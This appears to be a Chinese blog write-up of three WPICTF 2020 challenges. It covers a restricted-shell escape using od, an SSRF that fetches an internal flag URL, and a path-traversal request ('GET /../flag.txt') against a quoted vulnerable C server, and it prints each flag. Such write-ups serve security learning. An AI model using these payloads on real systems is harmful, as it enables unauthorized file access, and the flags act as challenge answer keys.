---
title: wpictf2020-wp
date: 2020-04-18 17:07:25
updated: 2020-04-18 17:07:25
tags:
 - ctf
 - wp
categories:
 - 日常刷题
---

# linux

## Suckmore Shell 2.0

题目给出了ssh服务器连接上后export不能用了

<!--more-->

Cat、tac、less等之类都能用后面发现od可以使用. [参考链接](https://www.cnblogs.com/ur10ser/p/7624367.html)

```bash
sx@kali blog % ssh smsh@smsh.wpictf.xyz
Password: 
> ls
flag
      
> 
> od -c flag
0000000   e   c   h   o       "   W   P   I   {   S   U   c   k   m   o
0000020   r   e   S   o   f   t   w   a   r   e   N   3   3   d   z   2
0000040   G   3   T   i   t   T   o   g   e   T   H   E   R   }   "  \n
0000060
> 
```





# web

## 👉😎👉

这个题目给了一堆emoji

![](/pic/147.png)

还给了一个网站

![](/pic/148.png)

在attach中有存在ssrf

![](/pic/149.png)

直接给出了flag， url填入http://storage.zoop/flag.txt即可

```
WPI{tH4nKs_z00m3r_jh0n50n}
```



## dorsia2

题目描述如下

```
http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The second card.

http://dorsia2.wpictf.xyz:31337/index.html or 31338 or 31339

Firefox doesnt like the page... try chromium.


Hint: flag in ~/flag.txt
```

在视频中第二张卡片的内容为

```c
void main() {
char a[69]={0};
scanf("GET /%s", &a);
printf("HTTP 200\r\n\r\n");
fflush(stdout); 
execlp("cat",a,a,0);}
```

使用chrome浏览器访问，提示文本为发送。

使用nc/burp suite获取flag.txt

```bash
ncat dorsia2.wpictf.xyz 31337 
GET /../flag.txt
HTTP 200

WPI{1_H4VE_2_return_SOME_VIDE0TAP3S}
```

```http
GET /../flag.txt HTTP/1.1
Host: dorsia2.wpictf.xyz:31337
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

